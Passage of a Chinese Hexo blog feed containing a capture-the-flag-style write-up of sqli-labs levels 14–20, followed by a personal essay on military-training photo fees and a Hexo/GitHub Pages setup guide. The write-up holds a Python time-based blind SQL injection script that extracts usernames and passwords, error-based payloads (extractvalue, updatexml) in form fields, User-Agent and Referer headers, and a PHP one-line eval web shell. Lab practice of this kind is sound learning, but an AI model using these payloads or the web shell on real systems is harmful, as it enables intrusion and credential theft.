src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png" alt="img"></a></p><p>而第14关就是语句的闭合方式变为双引号，可按照同样的方式进行注入。</p><hr><h3 id="15-16"><a href="#15-16" class="headerlink" title="15~16"></a>15~16</h3><p> 这两关是post类型的盲注。有了之前get类型中盲注的经验，这两关也就不那么复杂了。</p><p>此时的页面是不会提供一丁点信息的，语句正确与否只会弹出一张图片来告诉我们是否登录成功，而这个信息对我们来说是没用的，所以想到利用盲注的方法来进行注入。在尝试bool型盲注无效后转为用time类型的盲注。</p><p> 完善了一下之前的脚本，顺利完成任务。贴一下脚本的主要代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-meta">#playload:</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br>dic = <span class="hljs-string">&#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()~`!@#$%^&amp;*-=+[]&#123;&#125;;:&#x27;</span>&quot;|\,&lt;.&gt;/?&#x27;&#x27;&#x27;#基于这个字典循环爆破<br>string = &#x27;&#x27;<br>url = &quot;http://<span class="hljs-number">192.168</span><span class="hljs-number">.147</span><span class="hljs-number">.181</span>/sqli-labs-master/Less<span class="hljs-number">-15</span>/&quot;<br>for i in range(1, 100)  <br>for j in dic:<br>    payload = &#x27;&#x27;&#x27;admin&quot;)<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr((<span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),&#123;&#125;,<span class="hljs-number">1</span>)=&#123;&#125;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)#<span class="hljs-string">&#x27;&#x27;&#x27;.format(int(i), ascii(j))</span><br><span class="hljs-string">        # 针对不同题目修改payload与data</span><br><span class="hljs-string">         data = &#123;</span><br><span class="hljs-string">                &#x27;</span>unam<span class="hljs-string">e&#x27;: payload,</span><br><span class="hljs-string">                &#x27;</span>passwd<span class="hljs-string">&#x27;: &#x27;</span>&amp;submit=Submit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">         &#125;</span><br><span class="hljs-string">          # print(data)</span><br><span class="hljs-string">         response = requests.post(url, data=data)</span><br><span class="hljs-string">         sec = response.elapsed.total_seconds()</span><br><span class="hljs-string"></span><br><span class="hljs-string">         if sec &gt; 2: </span><br><span class="hljs-string">         string += j</span><br><span class="hljs-string">            print(string)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">print(string)</span><br></code></pre></div></td></tr></table></figure><p>爆破的部分结果图：</p><p>有点奇怪为什么账号和密码用的是y来隔开，依照我用的语句应该是~隔开才对</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;&#x27;admin&quot;)and if(substr((select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(i), <span class="hljs-built_in">ascii</span>(j))<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png" alt="img"></a></p><hr><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p>这道题有提示说是password reset，通过尝试登录可以发现这关会检测你输入的用户名，当用户名错误的时候会显示友好的提示来鼓励你</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211641.png"></p><p>而用户名正确时会弹出不一样的界面：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211808.png"></p><p>它会提示你密码已更新。</p><p>尝试在password处构造一些基本的sql注入语句，都失败了。如图所示order by字段数都查不了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910213407.png"></p><p>在这里我们又需要另一种方法——报错注入</p><p>（其实第5、6关也能用报错注入，这是在有报错语句提示的时候也许就能用上的方法）</p><p>报错注入可分别使用以下两种函数 ：</p><ul><li>extractvalue（）</li><li> updatexml（）</li></ul><p>基本格式：</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">?id=1<span class="hljs-built_in"> and/or </span>updatexml(1,(payload),1)<br>?id=1<span class="hljs-built_in"> and/or </span>extractvalue(1,concat(0x7e,(payload),0x7e))<span class="hljs-comment">#</span><br>//仍然需要先尝试使用单双引号来先闭合语句再来构造sql注入语句<br></code></pre></div></td></tr></table></figure><p>在这里执行语句如下</p><p>(你会发现下面三种语句好像都不是固定的语法，我尝试找了下规则，还是觉得记住</p><p>**<code>extractvalue(1,concat(0x7e,(payload),0x7e))#</code>**这一种形式就好了)</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//查询当前数据库</span><br>passwd=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database(</span>))))#</span><br><span class="hljs-function"><span class="hljs-comment">//查询所有的数据库名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1)#</span><br><span class="hljs-function"><span class="hljs-comment">//查user下的表名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-meta">#</span><br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20210910222943565.png"></p><p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910222833.png"></p><p>值得注意的是，这关不让直接查user表，当sql语句为    <code> and extractvalue(1,concat(0x7e,(select group_concat(username) from security.users),0x7e))#</code>会弹出如下结果：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911105416.png"></p><p>所以需要换个名字绕过</p><p><code>and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e))</code></p><p>另外我发现我数据库中好像所有的password都没了，像是这样。。。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154244.png"></p><hr><h3 id="18-20"><a href="#18-20" class="headerlink" title="18~20"></a>18~20</h3><p>通过提示并查看源码可知第18关的注入点不在username和password上了，而在数据包的User-Agent处。</p><p>通过尝试构造sql注入语句发现有报错信息，所以继续采取报错注入</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152728.png"></p><p><code>User-Agent: 1&#39;and extractvalue(1,concat(0x7e,(database()),0x7e)) and &#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152654.png"></p><p>成功查询到当前数据库名。</p><p>另外这里的语句末尾并不是用注释符#闭合，而是’1‘=’1来闭合。</p><p>剩下的步骤就是利用报错注入，不再重复。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911153419.png"></p><p>而第19关就从ua变成了Referer</p><p><code>Referer: &#39;and extractvalue(1,concat(0x7e,(database()),0x7e))  and&#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154938.png"></p><p>不再赘述。</p><p>20关是在cooki处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911155830.png"></p><hr><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr><ul><li><p>1~4 GET - Error base 类型，很直白的把信息都显示出来，没啥好说的。</p></li><li><p>5~6 GET -double 类型，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。用到了mysql数据库rand,group_by,count函数结合使用的特性（bug？），原理有点复杂，和前面基础类型相比，就结果而言其实就是order by后面的步骤中，</p><p><code>union select 1,2...</code> 变成了</p><p><code>union select count(*),concat( (select ..), floor(rand(14)*2))as c from 任一一个表名 group by     c</code></p><p>另外，group_concat拼接在语句中会失效（不知道为啥），使用limit语句作为代替来查询 more than 1 row 的数据。</p></li><li><p>7 GET -Dump into out file 类型，文件上传漏洞。使用into outfile函数，指定服务器上的绝对路径可实现上传文件，可用来上传一句话木马<code> &lt;?php @eval($_POST[&quot;密码&quot;]);?&gt;</code>，配合中国菜刀（攻击工具）达成目的。</p><p><em>小插曲：我就在这里写了个一句话木马（虽然在这里并不起作用），win10 的defender还是检测到了并弹出了危险警告。真是苦了defender能在我写的一堆垃圾中还找到疑似病毒的东西</em></p></li></ul><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg" alt="img"></a></p><p>不过这防火墙是真烦人，打开文件就报毒，搞得我都误删了一次，还得把相关文件夹加进白名单。</p><ul><li><p>8 GET - Blind - Boolian Based 类型 掌握一些截取字符的函数。从这开始最好就要学会使用脚本工具了。</p></li><li><p>9~10 GET - Blind - Time Based 类型 掌握sleep函数。</p><p>盲注是最常见的sql注入类型，所以有必要仔细掌握。盲注采取的攻击语句并没什么变化，只是多了截取字符与字典比较的过程，这种爆破的思路很适合用脚本解决。</p></li><li><p>11~12 POST-Error Based 类型 接触到post类型的注入，最大的变化是不通过url地址栏，而是通过上传数据的表单进行注入攻击了，语句也不再通过浏览器url解析，如注释符“#”直接用而不再是用“%23”。</p></li><li><p>13~14 POST-double 类型。方法同get。</p></li><li><p>15~16 POST-Blind 类型。（虽说关卡名字说是布尔注入，但我没找到语句正确与错误时返回页面的不同，可能需要抓包来看了）。同样用python脚本解决，对python的掌握程度要求并不高。</p></li><li><p>17 POST-Update类型。利用已有账户，对其修改密码处注入，注入方式为报错注入。用到了extractvalue()或updatexml()函数</p></li><li><p>18~20 POST header/cookie 类型。就是注入的位置不在明显的页面中，而在数据包内。后面这几关都是采取的报错注入的方式。</p></li></ul><hr><p>断断续续弄了这么久，终于做完了前20关…有缘再写后面的了</p><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不为五斗米取照片</title>
    <link href="/2021/05/16/%E4%B8%8D%E4%B8%BA%E4%BA%94%E6%96%97%E7%B1%B3%E5%8F%96%E7%85%A7%E7%89%87/"/>
    <url>/2021/05/16/%E4%B8%8D%E4%B8%BA%E4%BA%94%E6%96%97%E7%B1%B3%E5%8F%96%E7%85%A7%E7%89%87/</url>
    
    <content type="html"><![CDATA[<hr><p>本来该九月份军训的，因为新冠肺炎推迟到了次年五月。</p><p>今天是军训的第七天。</p><p>上午，教官再次提了集体照的事。</p><span id="more"></span><hr><p>教官是个什么职业？</p><p>教官们可能都普遍有个军人身份。褪去之后，也是老百姓，要上班的。</p><p>教官，兼职罢了，和家教那种挺像的。当然这只是个人看法。（我贱民可不敢把话说太狂……）</p><p>人总想着赚钱，就开创了副业。</p><p>教官们也有副业，开照相馆的。</p><p>同室友聊天才知道，我们的教官头子，教官们叫他参谋长，是开照相馆的，微信号就是他照相公司营业的号。</p><hr><p>军训的第三四天左右，教官就开始说照集体照的事。</p><p>大意是：</p><p>过两天所有人都要拍集体照，照片15块一张，自愿购买，不买就没照片，去外面照相还不止这个价，就只有这两天时间交钱。</p><p>毕竟这可能是我们人生中最后一次军训了，值得回忆巴拉巴拉……</p><p>话说的好听且在理，但我不是很想要照片，纯属个人原因。</p><p>15块不贵也值一顿午饭，应该比一张我几乎不会用到的纸划算。</p><p>当然，目前为止合情合理，额外提供实际服务，绝对自愿。</p><p>而一想到参谋长微信的传闻我就感觉事情没这么简单。</p><p>后面几天，训练的时候教官在操场催交钱，同时微信群收款行云流水。我有理由认为建立微信群相当大的一个理由就是方便收钱。</p><p>说是自愿，100人左右的连队只有大概30%的人交钱时，我们教官满脸不高兴，说是这两天截至，过了时间又一再延期。</p><p>催了数次，问了数次哪些人没交。</p><p>我们教官问一位训练得很好的同学，“你有没有交照片钱？” “交了”。</p><p>于是我们教官指着他对其他没交钱的同学说，“你看看！”，还挺骄傲的。</p><p>这是叫我们向榜样学习呢。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/WQNMD_txbb.png"></p><p>我默不作声，随你便吧。</p><p>而真正让我觉得离谱的，是照相过后发生的事。</p><hr><p>连队一个接一个照相，我们照完后在操场上休息。接着几个别的连队的教官过来叫我们集合，几个连坐在一起。</p><p>教官们又要催交钱。这破事还要集体做次思想工作。</p><p>要是开学日期能像交钱这回事的截至日期一样一再延迟就好了。</p><p>教官们这次来催钱的方式很奇特。</p><p>他们派了一个演说家，也是一位教官头头，平时拿着话筒发号施令，也常来视察方队的训练情况。</p><p>第一次我们见到他的时按照礼节问候说，教官好，他说不得行，该叫大哥好，因为他是我们团的老大。</p><p>我们说“大哥好！”</p><p>他说道，”喔对头！这个团我管事！晚上夜训，想不想我罩着你们？带你们尽情的耍，我说了算！“</p><p>我们几个连队都在笑，有大哥好啊。</p><p>”前提是你们要把自己的事做好哈！只要你们做好了，想咋个耍咋个耍！“另外的教官说道”懂得都懂。“</p><hr><p>同学们懂了，他们戏称15块充个剩下7天军训vip。</p><p>我也懂了。要我叫你大哥还要给你钱。斯德哥尔摩综合症是吧。没本事还想站着把钱挣了。</p><p>军训照片，我的回忆，他们的人民币。药药切克闹。</p><p>我不为五斗米取照片。</p><p>怎么训练我无所谓的，我不仅铁了心不要照片，顺手还退了微信的群。我管你是不是有什么照片率的指标要完成。</p><p>”大哥“说了一圈过后，要照片的人多了不少。</p><p>接着，我们教官要求发收款码的同学念一下交了钱的人的名字。</p><p>在他念名字的途中，我猜又多了不少”想“要照片的。</p><p>还红脸白脸轮番来，就差一句坦白从宽抗拒从严了。</p><p>我们教官念完名字说到”没交钱的站起来。</p><p>不站起来他也发现不了。</p><p>可他凭什么让我站起来。</p><p>我想到的可不是什么人在屋檐下，不得不低头，而是深明大义宁折不屈。我站起来准备接收“表扬”。</p><hr><p>同我的一同站起来的还有前面几个同学。教官挨个单独问话，他们有的说什么没加群马上加群啊，刚刚才交完钱啊…….站起来几个人又补交了不少。</p><p>我本想说，就是不想要照片，但被教官单独问到”你为什么不交钱“时却只蹦出来一个字，”穷。“</p><p>”那你坐下吧。“</p><p>结束了。</p><p>我原以为会有一场据理力争荡气回肠的battle呢。靠。</p><p>之前那几位没交钱的同学，究竟是怎么想的呢……</p><hr><p>现在回想起来，我该直接就说不想要的。</p><p>有多少同学是迫于压力才要照片的呢，教官们究竟会不会或者已经越界了呢，不得而知了。</p><hr><p>另：</p><p>当天晚训的时候还是按照常规训练。</p><p>我们连队里有以下两个极具代表性的声音：</p><p>1.”我大哥喃？？来带我耍啊？“</p><p>2.“RNM！退钱！！！”</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/RNM_tq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建自己的博客</title>
    <link href="/2021/05/15/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/05/15/%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<hr><p><em>记录一下自己第一次搭建静态博客的经历</em></p><p><strong>本文不会记录详细的操作过程,只是整理流程与记录心得 ^_^</strong></p><hr><span id="more"></span> <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><hr><ul><li><p>所用主机</p><ul><li>win10</li></ul></li><li><p>所用软件</p><ul><li><p>git </p><ul><li><p>git是什么？</p><p>​        版本控制工具，方便在不同版本进行切换修改，类似文件分不同时间备份让后需要时找回其中一份代替，同时git所带的<code>git bash</code>方便用户在windows下使用git命令的模拟终端（windows自带的cmd功能太弱）linux、unix可以直接使用git。</p><p><strong>在搭建博客的过程中也主要使用的这个模拟终端的功能，甚至用于版本控制的git命令都用不上。有点像买部手机只使用它的照明灯功能。</strong></p></li></ul></li><li><p>node.js(JavaScript 运行环境,)</p><p>随node.js一同安装的包管理工具npm,使用npm安装的模块hexo</p><ul><li><p>什么是包管理工具？ </p><p>​      也叫包管理器,它允许用户在操作系统上安装、删除、升级、配置和管理软件包。软件包管理器可以是像“软件中心”这样的图形化应用，也可以是像 <a href="https://itsfoss.com/apt-vs-apt-get-difference/">    apt-get</a> 或 <a href="https://itsfoss.com/pacman-command/">pacman</a> 这样的命令行工具,python中的pip即为一种包管理工具。</p></li></ul></li></ul></li></ul><ul><li><p>所借助的平台</p><ul><li><p>github</p><ul><li><p>github是什么？</p><p><del>同性交友网站</del></p><p>利用git进行代码管理的托管平台</p></li><li><p>为什么选择github?</p><p>github有一个很有爱的项目,叫做<code>github pages</code>,这个项目是给开发者建立一个私人页面,所以许多人都拿来搭博客用了,在创建仓库的时候将仓库名名为:用户名.github.io时开启</p><p>即用github pages项目代替了服务器,缺点就是功能不完全,只能控制小部分范围,但这对搭建个人静态博客够用了,用码云gitee同理。</p></li></ul></li></ul><p>​    </p></li></ul><hr><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><hr><p><em>简单来说就是在本地计算机搭建Hexo环境，Hexo通过generate命令将*.md文件渲染成静态的html页面，然后Hexo通过deploy命令触发git用户通过公钥免密登陆服务器(这里的github即作为托管服务器)，进而将静态页面推送到服务器的git仓库（repository）中。然后，服务器再通过钩子（git-hooks） 将静态页面checkout到网站的根目录下，进而实现博客的自动部署。</em></p><p><strong>就是敲几个命令，让git和hexo帮你把几件事办完了。</strong></p><hr><h3 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h3><hr><ul><li><p>下载git,配置用户信息</p><p>这里需要配置用户名和邮箱。而这些信息并不是起权限验证的作用,这么做的一个目的是为了记录操作过程，就是方便给人看的，如记录某某上传了什么或者干了别的什么。可以随便输入用户名和邮箱但不推荐。</p></li><li><p>将git与github链接在一起</p><ul><li><p>将git与github进行ssh key链接</p><ul><li><p>什么是ssh？</p><blockquote><p><em>SSH 为 Secure Shell （安全外壳协议）的缩写，SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。即可用ssh协议远程登陆主机，这里的远程主机即为github仓库。</em>—摘自《百度百科》</p></blockquote></li><li><p>为什么GitHub需要SSH Key呢？</p><blockquote><p>因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提           交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。—摘自廖雪峰老师网站</p></blockquote><p>​                                                                                 </p></li></ul></li></ul></li></ul><p>使用git创建ssh密钥，然后将这个密钥添加到github用户的账号中，这样用户即可实现用git免密登录管理github了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>值得一提的是生成密钥的命令，常常如下：<br><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><br>-t 用来指定加密算法为 rsa；<br>-C 后面是个注释信息，并不一定要和你 Git 账户的邮箱或者 Git 账户名保持一致，只是常常是和你账户邮箱保持一致，这样设置，就能知道这个公钥被绑定在哪个 Git 账户上了<br></code></pre></div></td></tr></table></figure><ul><li><p>使用hexo搭建博客</p><p>通过在git bash 中使用一些hexo命令。即可实现博客的搭建与上传。</p><p>hexo的工作流程：</p><ul><li><p>hexo  init  文件名 ：</p><p>​        创建一个初始化的文件，里面有搭建hexo博客所需的基本文件，后续操作以及关于博客的修改都在这个文件中进行。</p></li><li><p>hexo g：</p><p>​        生成静态文件。将我们的数据和界面相结合生成静态文件的过程。会遍历主题文件中的 <code>source</code> 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 <code>pubilc</code> 文件夹，此时的 <code>public</code> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 <code>index.html</code> 作为入口访问你的博客。</p></li><li><p>hexo s:</p><p>生成本地预览文件，通过浏览器搜索localhost:4000即可查看生成的静态博客 </p></li><li><p>hexo d：</p><p>部署文件，即将静态博客上传到服务器上。部署主要是根据在 <code>_config.yml</code> 中配置的git仓库，将博客中<code>public</code>文件上传至 github  中。然后再根据上面的 github 提供的 pages 服务呈现出页面。</p><ul><li><p>如果出现本地预览与部署到服务器上不同的情况，按F12发现css效果缺失，这是由于博客的config配置文件中指名一些css的地址只在localhost下是正确的，而指向服务器的仓库时是错误的，解决办法如下</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>在配置文件url那一部分中加入<br><br> root：/<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_build_illustration.png"></p></li></ul></li></ul><p>​        后续将md类型的文件加入到该文件\source\_posts中即可对博客内容进行修改（不推荐这么做，后文有写原因）。具体样式还需要查看博客主题的的设置，默认的博客主题为landscape。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">整个流程中关于_config.yml配置的配置很关键<br>注意空格不能少<br><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">    type:</span> git<br><span class="hljs-symbol">    repo:</span> https:<span class="hljs-comment">//github.com/2693993651/2693993651.github.io.git</span><br><span class="hljs-symbol">    branch:</span> main<br>这个配置好之后，即可使用hexo d 命令了<br>另外，因为githu在国内很难访问，hexo d这个命令都可能因不能链接到服务器而失败，需要重试几次。如果部署到gitee就没这个问题。<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="博客的优化"><a href="#博客的优化" class="headerlink" title="博客的优化"></a>博客的优化</h3><hr><ul><li><p>关于文章</p><figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//建议写文章前先执行以下命令</span><br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></div></td></tr></table></figure><p>执行这些命令完善博客的模块结构，以上三条命令执行后博客就会有三个新模块生效了，分别是分类，标签，about(关于)。而执行之前这三个模块是不能启用的,甚至在启用某些主题时页面完全失效。（about页面还需要到对应的主题配置里面设置才能生效，如遇困难可对照主题的官方文档，因为不是所有主题的about页面设置都一样，官方可能会写明使用方法）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration02.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration01.png"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>建议用下条命令生成新文章<br>hexo n [布局名称] &lt;文档名称&gt;<br></code></pre></div></td></tr></table></figure><p>其中布局名称可以省略，如果省略则默认为post布局。对post进行修改或者创建新的布局，在写文章时会方便很多</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration.png"></p><p>hexo n 执行后会在_post文件夹下生成一个新的md文件，虽然前文说到直接把新的md文件拖到这个文件夹也行，但还是建议用hexo n命令生成文件之后，再对这个文件修改，以下为原因：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration02.png"></p><p>​            </p><p>这样生成的文章有自己规范的开头格式，方便对文章进行规范与整理，还能顺手加个more标签</p><p>关于主题</p><p>需要下载主题并配置，关于博客的优化还需要查阅所选主题的官方文档来进行操作，去goole看看别人是怎么使用这个主题的会有很大帮助。</p></li></ul><hr><h3 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h3><hr><p>域名网站上注册账号，买一个域名</p><ul><li><p>在万网控制台添加解析记录</p><p>这里的解析记录有两条分别为CNAME和A记录</p><ul><li><p>CNAME</p><p>www  ——&gt; 用户名.github.io</p></li><li><p>A</p><p>@       ——&gt;一个ipv4地址 (cmd中 ping 你的GitHub账户名.GitHub.io得到)</p></li></ul></li></ul><ul><li><p>在博客文件夹里的source里添加CNAME文件，里面写上购买的域名</p><p>​    <em>完成之后可在github对应仓库里的设置里查看是否有CNAME文件，网址是否已经保存</em></p></li><li><p>最后重新部署文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>即输入以下命令<br><br>hexo clean<br><span class="hljs-regexp">//</span>每次部署前都建议输入这个命令清除缓存文件和已生成的静态文件，以防修改不起作用<br>hexo g<br>hexo s<span class="hljs-regexp">//</span>先本地预览，先查看方便及时修改<br>hexo d<br></code></pre></div></td></tr></table></figure></li></ul><p>成功之后即可实现在浏览器中输入域名访问自己的博客了</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>其他领域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>有手就行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
